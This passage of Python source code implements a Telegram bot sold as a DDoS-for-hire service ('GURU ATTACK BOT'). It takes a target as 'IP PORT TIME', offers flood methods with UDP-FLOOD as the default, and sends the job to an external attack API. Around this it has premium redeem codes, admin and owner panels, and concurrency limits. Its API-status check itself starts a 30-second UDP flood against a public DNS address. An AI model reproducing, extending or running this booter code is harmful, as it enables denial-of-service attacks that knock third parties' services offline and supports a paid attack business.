    await update.message.reply_text(
        f"📊 *BOT STATUS*\n\n"
        f"🔄 Concurrent per attack: **{get_concurrent()}**\n"
        f"📡 Total API Concurrent: **{TOTAL_CONCURRENT}**\n"
        f"⚡ Active Attacks: **{stats['active_attacks']}**\n"
        f"📡 Used Concurrent: **{stats['used_concurrent']}**\n"
        f"📡 Remaining Concurrent: **{stats['remaining_concurrent']}**\n"
        f"👥 Users: {len(users)}\n"
        f"💥 Total Attacks: {stats['total_attacks']}\n"
        f"📡 Default: UDP-FLOOD",
        parse_mode='Markdown'
    )

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    args = context.args
    if not args:
        await update.message.reply_text(
            "🎫 *REDEEM CODE*\n\nSend: `/redeem CODE`\nExample: `/redeem ABC123XYZ`",
            parse_mode='Markdown'
        )
        return
    
    code = args[0].upper()
    
    user = db.get_user(user_id)
    if user and user.get('has_used_code'):
        await update.message.reply_text("❌ You already redeemed a code!")
        return
    
    result = db.use_code(code, user_id)
    
    if result:
        duration_text = "LIFETIME" if result['access_days'] >= 3650 else f"{result['access_days']} days"
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\nCode: `{code}`\nDuration: {duration_text}\n📊 Plan: PREMIUM",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text("❌ *INVALID CODE*\n\nThe code is invalid or already used.", parse_mode='Markdown')

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ Cancelled!")

# ===== CALLBACK HANDLERS =====
async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    pause_info = db.get_pause_info()
    if pause_info.get('paused', False):
        await query.edit_message_text("⏸️ *Bot is Paused*", parse_mode='Markdown')
        return
    
    can_start, msg = await attack_manager.can_start_attack(user_id)
    if not can_start:
        await query.edit_message_text(msg, parse_mode='Markdown')
        return
    
    keyboard = []
    for method in ATTACK_METHODS[:10]:
        label = f"📡 {method} {'⭐' if method == 'UDP-FLOOD' else ''}"
        keyboard.append([InlineKeyboardButton(label, callback_data=f"method_{method}")])
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="back")])
    
    stats = attack_manager.get_stats()
    max_attacks = TOTAL_CONCURRENT // get_concurrent()
    
    await query.edit_message_text(
        f"💥 *SELECT ATTACK METHOD*\n\n"
        f"🔄 Concurrent per attack: **{get_concurrent()}**\n"
        f"⚡ Active Attacks: **{stats['active_attacks']}**\n"
        f"📡 Used/Total Concurrent: **{stats['used_concurrent']}/{TOTAL_CONCURRENT}**\n"
        f"📡 Remaining Concurrent: **{stats['remaining_concurrent']}**\n"
        f"📡 Max simultaneous: **{max_attacks}**\n"
        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n\n"
        f"⭐ UDP-FLOOD is the default method\n\n"
        f"After selecting, send: `IP PORT TIME`",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.replace('method_', '')
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"📡 *Method Selected: {method}*\n\n"
        f"Send: `IP PORT TIME`\n"
        f"Example: `8.8.8.8 43 30`\n\n"
        f"🔄 Concurrent: **{get_concurrent()}**\n"
        f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
        f"Send /cancel to cancel",
        parse_mode='Markdown'
    )

async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    plan, expiry = db.get_user_plan(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    if plan == "free" and not is_owner:
        text = (
            "👤 *MY PLAN*\n\n"
            "📊 Plan: 🆓 FREE\n"
            "⏱️ Status: Inactive\n\n"
            "💡 Use `/redeem CODE` to upgrade."
        )
    else:
        if is_owner:
            text = (
                "👑 *OWNER ACCESS*\n\n"
                "📊 Plan: 💎 PREMIUM (Owner)\n"
                f"⚡ {get_concurrent()}x Concurrent per attack\n"
                f"📡 Total API Concurrent: {TOTAL_CONCURRENT}\n"
                f"📡 Max simultaneous: {TOTAL_CONCURRENT // get_concurrent()}\n"
                f"📡 {len(ATTACK_METHODS)} Attack Methods"
            )
        elif expiry:
            days_left = max(0, (expiry - datetime.now()).days)
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                f"⏱️ Remaining: {days_left} days\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                "📌 Features:\n"
                f"• {get_concurrent()}x Concurrent per attack\n"
                f"• Total API Concurrent: {TOTAL_CONCURRENT}\n"
                f"• Max simultaneous: {TOTAL_CONCURRENT // get_concurrent()}\n"
                f"• {len(ATTACK_METHODS)} attack methods"
            )
        else:
            text = (
                "👤 *MY PLAN*\n\n"
                "📊 Plan: 💎 PREMIUM\n"
                "⏱️ Status: LIFETIME\n\n"
                "📌 Features:\n"
                f"• {get_concurrent()}x Concurrent per attack\n"
                f"• Total API Concurrent: {TOTAL_CONCURRENT}\n"
                f"• Max simultaneous: {TOTAL_CONCURRENT // get_concurrent()}\n"
                f"• {len(ATTACK_METHODS)} attack methods"
            )
    
    await query.edit_message_text(
        text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    users = db.get_all_users()
    admins = db.get_admins()
    stats = attack_manager.get_stats()
    total_attacks = db.get_total_attacks()
    banned_users = len([u for u in users if u.get('is_banned')])
    premium_users = sum(1 for u in users if u.get('plan') == 'premium')
    
    max_attacks = TOTAL_CONCURRENT // get_concurrent()
    
    await query.edit_message_text(
        f"📊 *BOT STATISTICS*\n\n"
        f"👥 Users: {len(users)}\n"
        f"💎 Premium: {premium_users}\n"
        f"🚫 Banned: {banned_users}\n"
        f"👑 Admins: {len(admins)}\n"
        f"💥 Attacks: {total_attacks}\n"
        f"🔄 Concurrent per attack: {get_concurrent()}\n"
        f"📡 Total API Concurrent: {TOTAL_CONCURRENT}\n"
        f"📡 Max simultaneous: {max_attacks}\n"
        f"⚡ Active Attacks: {stats['active_attacks']}\n"
        f"📡 Used/Total Concurrent: {stats['used_concurrent']}/{TOTAL_CONCURRENT}",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_admin(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GENERATE CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🗑️ DELETE UNUSED CODE", callback_data="admin_delete")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("📅 1 DAY", callback_data="gen_1d")],
        [InlineKeyboardButton("📅 3 DAYS", callback_data="gen_3d")],
        [InlineKeyboardButton("📅 7 DAYS", callback_data="gen_7d")],
        [InlineKeyboardButton("📅 30 DAYS", callback_data="gen_30d")],
        [InlineKeyboardButton("📅 LIFETIME", callback_data="gen_lifetime")],
        [InlineKeyboardButton("🔙 BACK", callback_data="admin")]
    ]
    
    await query.edit_message_text(
        "➕ *GENERATE CODE*\n\nSelect duration:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')[1]
    days = 3650 if data == "lifetime" else int(data.replace('d', ''))
    
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    if db.create_code(code, days, query.from_user.id):
        duration_text = "LIFETIME" if days >= 3650 else f"{days} days"
        await query.edit_message_text(
            f"✅ *CODE GENERATED*\n\nCode: `{code}`\nDuration: {duration_text}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to generate code!")

async def admin_list_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes()
    if not codes:
        text = "📋 No codes generated yet."
    else:
        text = "📋 *REDEEM CODES*\n\n"
        for c in codes[:10]:
            status = "✅" if not c.get('is_used') else "❌ Used"
            duration_text = "LIFETIME" if c['access_days'] >= 3650 else f"{c['access_days']}d"
            text += f"`{c['code']}` - {duration_text} - {status}\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_delete_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    codes = db.get_codes(only_unused=True)
    if not codes:
        await query.edit_message_text(
            "📋 No unused codes to delete!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
        return
    
    keyboard = []
    for c in codes[:10]:
        code = c['code']
        keyboard.append([InlineKeyboardButton(f"❌ {code}", callback_data=f"delunused_{code}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="admin")])
    
    await query.edit_message_text(
        "🗑️ *DELETE UNUSED CODES*\n\nSelect a code to delete:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def process_delete_unused_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    code = query.data.replace('delunused_', '')
    if db.delete_code(code):
        await query.edit_message_text(
            f"✅ Code `{code}` deleted!",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
        )
    else:
        await query.edit_message_text("❌ Failed to delete code!")

async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📢 *BROADCAST*\n\nSend me the message to broadcast.\nSend /cancel to cancel.",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_broadcast'] = False
        await update.message.reply_text("✅ Broadcast cancelled.")
        return
    
    user_id = update.effective_user.id
    if not db.is_admin(user_id):
        context.user_data['awaiting_broadcast'] = False
        return
    
    users = db.get_all_users()
    if not users:
        await update.message.reply_text("❌ No users to broadcast to!")
        context.user_data['awaiting_broadcast'] = False
        return
    
    progress_msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
    
    successful = 0
    for i, user in enumerate(users):
        if db.is_banned(user['user_id']):
            continue
        
        try:
            await context.bot.send_message(
                chat_id=user['user_id'],
                text=update.message.text,
                parse_mode='Markdown'
            )
            successful += 1
        except:
            pass
        
        if (i + 1) % 10 == 0:
            try:
                await progress_msg.edit_text(
                    f"📢 *Broadcasting...*\n"
                    f"Progress: {i+1}/{len(users)}\n"
                    f"✅ Success: {successful}",
                    parse_mode='Markdown'
                )
            except:
                pass
        
        await asyncio.sleep(0.05)
    
    await progress_msg.edit_text(
        f"✅ *Broadcast Complete!*\n\n"
        f"👥 Total: {len(users)}\n"
        f"✅ Successful: {successful}\n"
        f"❌ Failed: {len(users) - successful}",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_broadcast'] = False

async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    pause_info = db.get_pause_info()
    pause_status = pause_info.get('paused', False)
    pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ RESUME BOT"
    stats = attack_manager.get_stats()
    
    keyboard = [
        [InlineKeyboardButton("⚡ SET CONCURRENT", callback_data="owner_concurrent")],
        [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
        [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="owner_unban")],
        [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
        [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
        [InlineKeyboardButton(pause_text, callback_data="owner_pause")],
        [InlineKeyboardButton("🔌 API STATUS", callback_data="owner_api_status")],
        [InlineKeyboardButton("🛑 STOP ALL ATTACKS", callback_data="owner_stop")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        f"👑 *OWNER PANEL*\n\n"
        f"Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\n"
        f"⚡ Active Attacks: {stats['active_attacks']}\n"
        f"🔄 Concurrent per attack: **{get_concurrent()}**\n"
        f"📡 Used/Total Concurrent: **{stats['used_concurrent']}/{TOTAL_CONCURRENT}**\n"
        f"📡 Max simultaneous: {TOTAL_CONCURRENT // get_concurrent()}",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def owner_concurrent_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        f"⚡ *SET CONCURRENT*\n\n"
        f"Current: **{get_concurrent()}**\n"
        f"Min: {MIN_CONCURRENT}\n"
        f"Max: {MAX_CONCURRENT}\n"
        f"Total API Concurrent: {TOTAL_CONCURRENT}\n"
        f"Max simultaneous attacks: {TOTAL_CONCURRENT // get_concurrent()}\n\n"
        f"Send: `/setconcurrent NUMBER`\n"
        f"Example: `/setconcurrent 2`",
        parse_mode='Markdown'
    )

async def owner_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    success, msg = await attack_manager.stop_attack(user_id)
    
    if success:
        await query.edit_message_text(
            f"🛑 *All Attacks Stopped!*\n\n{msg}",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text(f"❌ {msg}")

async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    if not db.is_owner_or_pseudo(user_id):
        await query.answer("Access denied!", show_alert=True)
        return
    
    current_pause = db.get_pause_info().get('paused', False)
    
    if current_pause:
        db.set_pause(False, user_id)
        await query.edit_message_text(
            "✅ *Bot Resumed*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        db.set_pause(True, user_id, "Owner paused")
        await query.edit_message_text(
            "⏸️ *Bot Paused*",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )

async def owner_promote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "👑 PROMOTE ADMIN\n\nSend: USER_ID\nSend /cancel to cancel"
    )
    context.user_data['awaiting_promote'] = True

async def process_promote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_promote'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_promote'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        user = db.get_user(user_id)
        
        if not user:
            await update.message.reply_text(f"❌ User {user_id} not found.")
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text(f"❌ User {user_id} is already an admin!")
            return
        
        db.add_admin(user_id, user.get('username', 'Unknown'), "admin", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} promoted to ADMIN!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_promote'] = False

async def owner_demote_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    keyboard = []
    
    for admin in admins:
        admin_id = admin['user_id']
        if admin_id != OWNER_ID and admin.get('level') != "pseudo_owner":
            keyboard.append([InlineKeyboardButton(f"❌ {admin_id}", callback_data=f"demote_{admin_id}")])
    
    keyboard.append([InlineKeyboardButton("🔙 BACK", callback_data="owner")])
    
    await query.edit_message_text(
        "👑 DEMOTE ADMIN\n\nClick an admin to demote:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def process_demote(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = int(query.data.split('_')[1])
    
    if user_id == OWNER_ID:
        await query.edit_message_text("❌ Cannot demote the owner!")
        return
    
    if db.remove_admin(user_id):
        await query.edit_message_text(
            f"✅ Admin {user_id} demoted!",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )
    else:
        await query.edit_message_text("❌ Failed to demote!")

async def owner_ban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🚫 BAN USER\n\nSend user ID to ban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_ban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        
        if user_id == OWNER_ID:
            await update.message.reply_text("❌ Cannot ban the owner!")
            context.user_data['awaiting_ban'] = False
            return
        
        if db.is_admin(user_id):
            await update.message.reply_text("❌ Cannot ban an admin!")
            context.user_data['awaiting_ban'] = False
            return
        
        db.ban_user(user_id, "Banned by owner", update.effective_user.id)
        await update.message.reply_text(f"✅ User {user_id} banned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_ban'] = False

async def owner_unban_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "✅ UNBAN USER\n\nSend user ID to unban:\nSend /cancel to cancel"
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_unban'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    try:
        user_id = int(update.message.text.strip())
        db.unban_user(user_id)
        await update.message.reply_text(f"✅ User {user_id} unbanned!")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID!")
    
    context.user_data['awaiting_unban'] = False

async def owner_list_admins_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    admins = db.get_admins()
    if not admins:
        await query.edit_message_text("👑 No admins found.")
        return
    
    text = "👑 ADMIN LIST\n\n"
    for admin in admins:
        level = admin.get('level', 'admin').upper()
        admin_id = admin['user_id']
        # Get username for admin
        user = db.get_user(admin_id)
        username = user.get('username', 'N/A') if user else 'N/A'
        text += f"• {admin_id} - @{username} - {level}\n"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_list_users_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    users = db.get_all_users()
    if not users:
        await query.edit_message_text("📋 No users found.")
        return
    
    text = "👥 ALL USERS\n\n"
    for user in users[:20]:
        user_id = user.get('user_id')
        username = user.get('username', 'N/A')
        plan = user.get('plan', 'free').upper()
        is_banned = "🚫" if user.get('is_banned') else "✅"
        is_admin = "⭐" if db.is_admin(user_id) else ""
        text += f"{is_banned}{is_admin} {user_id} - @{username} ({plan})\n"
    
    if len(users) > 20:
        text += f"\n... and {len(users) - 20} more"
    
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
    )

async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text("🔌 Checking API Status...")
    
    try:
        if not API_KEY:
            await query.edit_message_text("❌ API_KEY not configured!")
            return
        
        params = {
            "key": API_KEY,
            "host": "8.8.8.8",
            "port": "53",
            "time": "30",
            "method": "UDP-FLOOD",
            "concs": "1"
        }
        
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json, text/plain, */*"
        }
        
        timeout = aiohttp.ClientTimeout(total=35, connect=10)
        
        async with aiohttp.ClientSession(timeout=timeout, headers=headers) as session:
            start_time = time.time()
            async with session.get(API_URL, params=params) as response:
                elapsed = time.time() - start_time
                response_text = await response.text(encoding='utf-8', errors='ignore')
                
                try:
                    response_data = json.loads(response_text)
                except:
                    response_data = {"raw": response_text[:100]}
                
                if response.status == 200 and response_data.get('status') == 'success':
                    message = f"✅ API Connected - Status: {response.status} (Response: {elapsed:.2f}s)"
                    attack_id = response_data.get('attack_id', 'N/A')
                    details = f"🆔 Attack ID: {attack_id}"
                else:
                    error_msg = response_data.get('message', 'Unknown error')
                    message = f"⚠️ API Error: {error_msg}"
                    details = f"📊 Response: {str(response_data)[:200]}"
                
                await query.edit_message_text(
                    f"🔌 API STATUS\n\n{message}\n\n{details}\n\n⚡ Concurrent per attack: {get_concurrent()}\n📡 Total API Concurrent: {TOTAL_CONCURRENT}",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🔄 REFRESH", callback_data="owner_api_status")],
                        [InlineKeyboardButton("🔙 BACK", callback_data="owner")]
                    ])
                )
    except Exception as e:
        await query.edit_message_text(
            f"❌ API Error: {str(e)}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
        )

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user = update.effective_user
    user_id = user.id
    is_admin = db.is_admin(user_id)
    is_owner = db.is_owner_or_pseudo(user_id)
    
    keyboard = []
    if not db.is_banned(user_id):
        keyboard.append([InlineKeyboardButton("💥 ATTACK", callback_data="attack")])
        keyboard.append([InlineKeyboardButton("👤 MY PLAN", callback_data="my_plan")])
    
    if is_admin:
        keyboard.append([InlineKeyboardButton("📊 STATS", callback_data="stats")])
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    if is_owner:
        keyboard.append([InlineKeyboardButton("👑 OWNER", callback_data="owner")])
    
    await query.edit_message_text(
        "👋 WELCOME BACK",
        reply_markup=InlineKeyboardMarkup(keyboard) if keyboard else None
    )

async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('awaiting_attack'):
        await process_attack(update, context)
    elif context.user_data.get('awaiting_promote'):
        await process_promote(update, context)
    elif context.user_data.get('awaiting_ban'):
        await process_ban(update, context)
    elif context.user_data.get('awaiting_unban'):
        await process_unban(update, context)
    elif context.user_data.get('awaiting_broadcast'):
        await process_broadcast(update, context)

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("✅ Cancelled.")
        return
    
    # Call attack_command with the text as args
    args = update.message.text.split()
    context.args = args
    await attack_command(update, context)
    context.user_data['awaiting_attack'] = False

# ===== MAIN =====
def main():
    if not TELEGRAM_TOKEN:
        print("❌ TELEGRAM_TOKEN not set!")
        return
    
    print("=" * 60)
    print("🔥 GURU ATTACK BOT - MULTIPLE ATTACKS SUPPORT 🔥")
    print(f"⚡ DEFAULT CONCURRENT: {get_concurrent()}")
    print(f"📡 TOTAL API CONCURRENT: {TOTAL_CONCURRENT}")
    print(f"📡 MAX SIMULTANEOUS ATTACKS: {TOTAL_CONCURRENT // get_concurrent()}")
    print("=" * 60)
    print("💡 Commands:")
    print("  /attack IP PORT TIME [METHOD] - Start attack")
    print("  /stop [ID] - Stop specific or all attacks")
    print("  /setconcurrent NUMBER - Change concurrent value")
    print("  /status - Show bot status")
    print("  /redeem CODE - Redeem premium code")
    print("=" * 60)
    
    # Create application
    bot_app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # COMMANDS
    bot_app.add_handler(CommandHandler("start", start))
    bot_app.add_handler(CommandHandler("attack", attack_command))
    bot_app.add_handler(CommandHandler("stop", stop_command))
    bot_app.add_handler(CommandHandler("setconcurrent", set_concurrent_command))
    bot_app.add_handler(CommandHandler("testapi", testapi_command))
    bot_app.add_handler(CommandHandler("status", status_command))
    bot_app.add_handler(CommandHandler("redeem", redeem_command))
    bot_app.add_handler(CommandHandler("cancel", cancel))
    
    # CALLBACK QUERY HANDLERS
    bot_app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    bot_app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    bot_app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
    bot_app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    bot_app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    bot_app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    bot_app.add_handler(CallbackQueryHandler(admin_gen_callback, pattern="^admin_gen$"))
    bot_app.add_handler(CallbackQueryHandler(process_gen_callback, pattern="^gen_"))
    bot_app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
    bot_app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
    bot_app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
    bot_app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
    bot_app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
    bot_app.add_handler(CallbackQueryHandler(owner_concurrent_callback, pattern="^owner_concurrent$"))
    bot_app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
    bot_app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
    bot_app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_unban_callback, pattern="^owner_unban$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_admins_callback, pattern="^owner_list_admins$"))
    bot_app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
    bot_app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
    bot_app.add_handler(CallbackQueryHandler(owner_stop_callback, pattern="^owner_stop$"))
    bot_app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
    
    bot_app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
    
    # Start bot
    print("✅ Bot started! Press Ctrl+C to stop.")
    bot_app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()